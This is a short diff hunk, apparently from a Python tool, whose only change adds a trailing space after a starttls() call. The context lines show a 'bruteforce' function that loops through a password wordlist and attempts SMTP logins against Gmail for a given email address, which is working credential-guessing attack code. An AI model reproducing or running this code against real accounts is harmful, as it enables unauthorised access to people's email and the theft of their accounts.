@@ -23,7 +23,7 @@ def bruteforce(email, wordlist, vpn_enabled):
     for password in wl_lines:
         try:
             session = smtplib.SMTP(GMAIL_SMTP_SERVER, GMAIL_SMTP_PORT)
-            session.starttls()
+            session.starttls() 
             session.login(email, password.strip())
             
             os.system("clear")
